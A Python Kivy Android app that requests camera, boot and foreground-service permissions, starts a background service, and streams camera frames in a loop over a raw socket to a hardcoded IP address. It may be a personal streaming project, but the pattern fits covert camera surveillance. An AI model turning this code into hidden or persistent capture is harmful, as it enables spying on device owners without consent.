import socket
import cv2
import time
import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform
from plyer import notification

if platform == 'android':
    from android.permissions import request_permissions, Permission
    from jnius import autoclass

    request_permissions([
        Permission.CAMERA,
        Permission.INTERNET,
        Permission.FOREGROUND_SERVICE,
        Permission.RECEIVE_BOOT_COMPLETED
    ])

    PythonService = autoclass('org.kivy.android.PythonService')
    service = PythonService.mService
    if service is None:
        service = PythonService.start("service", "service.py")

class CameraApp(App):
    def build(self):
        self.label = Label(text="Streaming Video...")
        threading.Thread(target=self.stream_video, daemon=True).start()
        return self.label

    def stream_video(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect(('178.95.15.120', 12345))  # IP сервера
            cap = cv2.VideoCapture(0)

            while True:
                ret, frame = cap.read()
                if not ret:
                    break

                _, buffer = cv2.imencode('.jpg', frame)
                client_socket.sendall(buffer.tobytes())
                time.sleep(0.05)

        except Exception as e:
            print(f"Ошибка: {e}")
        finally:
            cap.release()
            client_socket.close()

if __name__ == '__main__':
    CameraApp().run()
